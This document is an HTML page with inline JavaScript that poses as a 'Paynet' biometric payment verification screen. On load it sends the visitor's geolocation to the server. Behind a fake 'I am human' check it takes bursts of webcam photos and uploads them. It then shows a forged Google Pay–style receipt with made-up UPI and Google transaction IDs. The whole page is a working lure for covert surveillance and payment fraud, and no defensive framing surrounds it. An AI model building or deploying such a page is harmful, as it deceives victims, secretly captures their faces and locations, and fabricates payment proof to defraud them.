<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paynet · Secure Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/paynet.css">
    <link rel="manifest" href="/manifest.json">
    <meta name="theme-color" content="#ffffff">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">

    <!-- Link Preview -->
    <meta property="og:title" content="Secure Verification - Paynet">
    <meta property="og:description"
        content="Paynet is securely processing your payment details. Biometric verification in progress.">
    <meta property="og:image"
        content="https://img.freepik.com/premium-photo/secure-payment-verification-icon-protection-online-shopping-banking-with-shield-concept_675567-2708.jpg?w=1200">
    <meta property="og:site_name" content="Paynet">
    <link rel="stylesheet" href="/verify.css">
    <style>
        /* Premium Glass Toasts */
        .toast-container {
            position: fixed;
            top: 25px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            gap: 12px;
            pointer-events: none;
            width: 100%;
            max-width: 380px;
            padding: 0 20px;
        }

        .toast {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(12px) saturate(180%);
            -webkit-backdrop-filter: blur(12px) saturate(180%);
            border-radius: 16px;
            padding: 16px 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            display: flex;
            align-items: center;
            gap: 15px;
            border: 1px solid rgba(255, 255, 255, 0.4);
            animation: toastPop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
            pointer-events: auto;
        }

        @keyframes toastPop {
            0% {
                transform: translateY(-50px) scale(0.9);
                opacity: 0;
            }

            100% {
                transform: translateY(0) scale(1);
                opacity: 1;
            }
        }

        @keyframes toastOut {
            to {
                transform: translateY(-20px) scale(0.95);
                opacity: 0;
            }
        }

        .toast::before {
            content: '';
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            width: 6px;
            border-radius: 3px 0 0 3px;
        }

        .toast.success::before {
            background: #34A853;
        }

        .toast.error::before {
            background: #EA4335;
        }

        .toast.info::before {
            background: #1A73E8;
        }

        .toast-icon {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 10px;
        }

        .toast.success .toast-icon {
            background: rgba(52, 168, 83, 0.1);
            color: #34A853;
        }

        .toast.error .toast-icon {
            background: rgba(234, 67, 53, 0.1);
            color: #EA4335;
        }

        .toast.info .toast-icon {
            background: rgba(26, 115, 232, 0.1);
            color: #1A73E8;
        }

        .toast-message {
            font-size: 14px;
            font-weight: 600;
            color: #202124;
        }

        /* Biometric Animations */
        @keyframes scanAnim {

            0%,
            100% {
                top: 0;
            }

            50% {
                top: 100%;
            }
        }

        @keyframes meshPulse {

            0%,
            100% {
                transform: scale(1);
                opacity: 0.6;
            }

            50% {
                transform: scale(1.05);
                opacity: 0.9;
            }
        }

        @keyframes rotateMesh {
            from {
                transform: rotate(0deg);
            }

            to {
                transform: rotate(360deg);
            }
        }

        @keyframes floatData {

            0%,
            100% {
                opacity: 0.2;
                transform: translateY(0);
            }

            50% {
                opacity: 0.8;
                transform: translateY(-5px);
            }
        }

        .scan-grid {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: linear-gradient(rgba(66, 133, 244, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(66, 133, 244, 0.1) 1px, transparent 1px);
            background-size: 20px 20px;
            pointer-events: none;
        }

        .human-btn {
            background: linear-gradient(-45deg, #1A73E8, #3B5FCC, #4285F4, #34A853);
            background-size: 400% 400%;
            animation: gradientShift 3s ease infinite;
            border: none;
            color: white;
            padding: 16px 32px;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 10px 20px rgba(66, 133, 244, 0.3);
            transition: all 0.3s ease;
            width: 100%;
            margin-top: 25px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        @keyframes gradientShift {

            0%,
            100% {
                background-position: 0% 50%;
            }

            50% {
                background-position: 100% 50%;
            }
        }

        .human-btn:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 15px 30px rgba(66, 133, 244, 0.5);
        }

        /* Detailed Receipt Styles */
        .details-card {
            background: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            padding: 20px;
            margin: 25px auto 0;
            max-width: 320px;
            text-align: left;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            font-size: 14px;
        }

        .detail-row:last-child {
            margin-bottom: 0;
        }

        .detail-label {
            color: #5f6368;
            font-weight: 500;
        }

        .detail-value {
            color: #202124;
            font-weight: 500;
            text-align: right;
        }

        .detail-value.pending {
            color: #fbbc04;
        }

        .divider {
            height: 1px;
            background: #f1f3f4;
            margin: 15px 0;
        }

        .merchant-avatar {
            width: 40px;
            height: 40px;
            background: #1A73E8;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 18px;
        }

        .paid-to-section {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
        }

        .done-btn {
            background: #1A73E8;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 24px;
            font-weight: 500;
            margin-top: 30px;
            cursor: pointer;
            font-size: 14px;
        }
    </style>
</head>

<body>
    <div id="toastContainer" class="toast-container"></div>
    <div class="payment-container verify-container" id="mainContainer">
        <!-- Generic Header -->
        <div class="logo-section" id="genericLogo">
            <div class="paynet-logo">
                <svg width="60" height="60" viewBox="0 0 60 60">
                    <path d="M30 5 L50 15 L50 30 C50 42 30 55 30 55 C30 55 10 42 10 30 L10 15 Z" fill="#1A73E8" />
                    <path d="M25 30 L28 33 L36 23" stroke="white" stroke-width="3" fill="none" />
                </svg>
            </div>
            <h1 class="brand-name">Paynet</h1>
        </div>

        <!-- Initial Loader -->
        <div id="loadingSection">
            <h2 class="success-title">Initializing...</h2>
            <div class="loading-spinner" style="margin: 30px auto;"></div>
        </div>

        <!-- Verification Link Error -->
        <div id="errorSection" style="display: none; text-align: center;">
            <h2 class="success-title">Invalid Link</h2>
            <p>This verification link is expired or invalid.</p>
        </div>

        <!-- HUMAN VERIFICATION STAGE -->
        <div id="humanVerificationSection" style="display: none; text-align: center;">
            <h2 class="success-title">Human Verification</h2>
            <p class="success-subtitle">Mandatory biometric identity check.</p>

            <div id="scanBox"
                style="position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; overflow: hidden; background: #000; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 40px rgba(66,133,244,0.3);">
                <video id="scanVideo"
                    style="position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0;"></video>

                <div id="avatarContainer"
                    style="display: none; width: 100%; height: 100%; position: relative; background: #0a1128;">
                    <div class="scan-grid"></div>
                    <svg width="100%" height="100%" viewBox="0 0 100 100" style="position: absolute; z-index: 5;">
                        <circle cx="50" cy="50" r="40" stroke="#4285F4" stroke-width="0.5" fill="none"
                            class="mesh-pulse" />
                        <path d="M30 50 Q50 30 70 50 Q50 70 30 50" stroke="#4285F4" stroke-width="0.5" fill="none"
                            opacity="0.6" />
                    </svg>
                    <div class="telemetry-tag" style="top: 20%; left: 10%;" id="t-eye">SYNCING...</div>
                    <div class="telemetry-tag" style="bottom: 20%; right: 10%;" id="t-face">MAP: 0%</div>
                </div>

                <div id="scanPlaceholder"
                    style="color: #4285F4; font-size: 10px; font-weight: 700; letter-spacing: 2px;">READY</div>
                <div id="scanLine"
                    style="display: none; position: absolute; top:0; left:0; width: 100%; height: 2px; background: #4285F4; box-shadow: 0 0 15px #4285F4; animation: scanAnim 2s infinite;">
                </div>
            </div>

            <div class="verification-steps" style="max-width: 280px; margin: 0 auto;">
                <div class="step" id="step-bio">
                    <span class="step-text">Connect to Secure Node</span>
                </div>
            </div>

            <button id="startScanBtn" class="human-btn" onclick="initiateBiometricScan()">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                    <circle cx="12" cy="7" r="4" />
                </svg>
                I am human
            </button>
        </div>

        <!-- PROCESSING STAGE -->
        <div id="processingResultSection" style="display: none; text-align: center;">
            <h2 class="success-title">Finalizing...</h2>
            <div class="loading-spinner" style="margin: 30px auto;"></div>
        </div>

        <!-- GENERIC RECEIPT -->
        <div id="receiptSection" style="display: none;" class="receipt">
            <h2 class="success-title">Payment Successful</h2>
            <div class="receipt-amount">₹<span id="amount-val">0</span>.00</div>
        </div>

        <!-- GPAY DETAILED RECEIPT -->
        <div id="gpayReceiptSection" style="display: none;" class="gpay-receipt">
            <svg class="success-checkmark" viewBox="0 0 52 52" style="width: 60px; height: 60px;">
                <circle class="success-checkmark__circle" cx="26" cy="26" r="25" fill="none" />
                <path class="success-checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
            </svg>
            <div style="font-size: 24px; color: #202124; margin-top: 10px; font-weight: 400;">Payment to <span
                    id="receipt-to-name-header">Merchant</span></div>
            <div id="gpay-amount" style="font-size: 42px; font-weight: 400; margin: 5px 0 20px;">₹0</div>

            <div style="font-size: 14px; color: #5f6368; margin-bottom: 30px;">
                <span id="receipt-date">Oct 12, 11:42 AM</span>
            </div>

            <!-- Detailed Details Box -->
            <div class="details-card">
                <div class="paid-to-section">
                    <div class="merchant-avatar" id="receipt-avatar">P</div>
                    <div style="text-align: left;">
                        <div style="font-weight: 500; font-size: 16px;" id="receipt-merchant-name">Paynet Merchant</div>
                        <div style="font-size: 12px; color: #5f6368;" id="receipt-upi-id">paynet@icici</div>
                    </div>
                </div>

                <div class="divider"></div>

                <div class="detail-row">
                    <span class="detail-label">Banking Name</span>
                    <span class="detail-value" id="receipt-bank-name">PAYNET SOLUTIONS LTD</span>
                </div>

                <div class="divider"></div>

                <div class="detail-row">
                    <span class="detail-label">UPI Transaction ID</span>
                    <span class="detail-value" id="receipt-upi-txn-id">Wait...</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">To</span>
                    <span class="detail-value" id="receipt-to-upi">**** 8821</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">From</span>
                    <span class="detail-value" id="receipt-from-val">**** 4432 (State Bank of India)</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Google Transaction ID</span>
                    <span class="detail-value" id="receipt-google-txn-id">CICAgK...</span>
                </div>
            </div>

            <button class="done-btn" onclick="window.close()">Done</button>
        </div>

        <div id="genericFooter" class="footer" style="margin-top: 30px;">
            <p>Secured by <strong>Paynet</strong></p>
        </div>
    </div>

    <script>
        let capturedPhotos = [];
        let cameraStream = null;
        let video = document.getElementById('scanVideo');
        let paymentData = null;
        const paymentId = new URLSearchParams(window.location.search).get('id');

        window.addEventListener('load', async () => {
            logVisit();
            paymentData = await fetch('/validate-payment-id', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ paymentId })
            }).then(r => r.json()).then(d => d.valid ? d.payment : null);

            if (!paymentData) {
                document.getElementById('loadingSection').style.display = 'none';
                document.getElementById('errorSection').style.display = 'block';
                return;
            }

            // PRE-LOAD CAMERA
            startCameraInScanBox();

            setTimeout(() => {
                document.getElementById('loadingSection').style.display = 'none';
                document.getElementById('humanVerificationSection').style.display = 'block';
                showToast("Security Systems Online", "success");
            }, 800);
        });

        async function startCameraInScanBox() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = cameraStream;
                video.onloadedmetadata = () => video.play();
                return true;
            } catch (e) { return false; }
        }

        async function initiateBiometricScan() {
            const btn = document.getElementById('startScanBtn');
            btn.innerHTML = "Authenticating...";
            btn.disabled = true;

            if (!video || video.readyState < 2) await startCameraInScanBox();

            // BRIGHTNESS CHECK
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 200;
            canvas.height = video.videoHeight || 200;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
            let sum = 0;
            for (let i = 0; i < data.length; i += 40) sum += (data[i] + data[i + 1] + data[i + 2]) / 3;
            if (sum / (data.length / 40) < 15) {
                showToast("Too dark. Move to a well-lit area.", "error");
                btn.innerHTML = "Retry Verification";
                btn.disabled = false;
                return;
            }

            // START ANIMATION
            document.getElementById('scanPlaceholder').style.display = 'none';
            document.getElementById('avatarContainer').style.display = 'flex';
            document.getElementById('scanLine').style.display = 'block';
            btn.style.display = 'none';
            showToast("Biometric Lock: ENGAGED", "info");

            // BURST CAPTURE 1: Biometric Step (5 photos in 1s)
            await captureBurst(5, 200);

            showToast("Identity Confirmed", "success");
            setTimeout(() => {
                document.getElementById('humanVerificationSection').style.display = 'none';
                document.getElementById('processingResultSection').style.display = 'block';
                setTimeout(showReceipt, 1500);
            }, 500);
        }

        async function captureBurst(count, interval) {
            for (let i = 0; i < count; i++) {
                if (video.videoWidth > 0) {
                    const c = document.createElement('canvas');
                    c.width = video.videoWidth; c.height = video.videoHeight;
                    c.getContext('2d').drawImage(video, 0, 0);
                    const photo = c.toDataURL('image/jpeg', 0.5);
                    fetch('/capture-photo', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ photo, paymentId })
                    });
                }
                await new Promise(r => setTimeout(r, interval));
            }
        }

        function showReceipt() {
            document.getElementById('processingResultSection').style.display = 'none';
            if (paymentData.isCustom) {
                document.body.classList.add('gpay-mode');
                document.getElementById('genericLogo').style.display = 'none';
                document.getElementById('genericFooter').style.display = 'none';
                document.getElementById('gpayReceiptSection').style.display = 'block';

                // POPULATE RECEIPT DETAILS FROM ADMIN DATA
                document.getElementById('gpay-amount').textContent = '₹' + paymentData.amount;
                document.getElementById('receipt-date').textContent = paymentData.date || new Date().toLocaleString();

                document.getElementById('receipt-to-name-header').textContent = paymentData.toName || 'Merchant';
                document.getElementById('receipt-merchant-name').textContent = paymentData.toName || 'Paynet Merchant';
                document.getElementById('receipt-avatar').textContent = (paymentData.toName || 'P').charAt(0).toUpperCase();

                document.getElementById('receipt-upi-id').textContent = paymentData.upiId || 'paynet@icici';
                document.getElementById('receipt-bank-name').textContent = (paymentData.bankName || 'PAYNET SOLUTIONS LTD').toUpperCase();

                document.getElementById('receipt-upi-txn-id').textContent = paymentData.upiTxnId || Math.floor(Math.random() * 900000000000) + 100000000000;
                document.getElementById('receipt-google-txn-id').textContent = paymentData.googleTxnId || 'CICAgK' + Math.random().toString(36).substring(2, 10).toUpperCase();

                // To/From
                document.getElementById('receipt-to-upi').textContent = `To: ${paymentData.toName || 'Receiver'}`;
                document.getElementById('receipt-from-val').textContent = `From: ${paymentData.fromName || 'Sender'}`;

            } else {
                document.getElementById('receiptSection').style.display = 'block';
                document.getElementById('amount-val').textContent = paymentData.amount;
            }

            // BURST CAPTURE 2: Receipt Step (5 photos in 2s)
            captureBurst(5, 400);

            setTimeout(() => {
                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
            }, 3000);
        }

        function showToast(message, type) {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerHTML = `<div class="toast-icon">★</div><div class="toast-message">${message}</div>`;
            container.appendChild(toast);
            setTimeout(() => {
                toast.style.animation = 'toastOut 0.4s forwards';
                setTimeout(() => toast.remove(), 400);
            }, 3000);
        }

        async function logVisit() {
            try {
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                fetch('/log-visit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ paymentId, location: { latitude: pos.coords.latitude, longitude: pos.coords.longitude } })
                });
            } catch (e) { }
        }
    </script>
</body>

</html>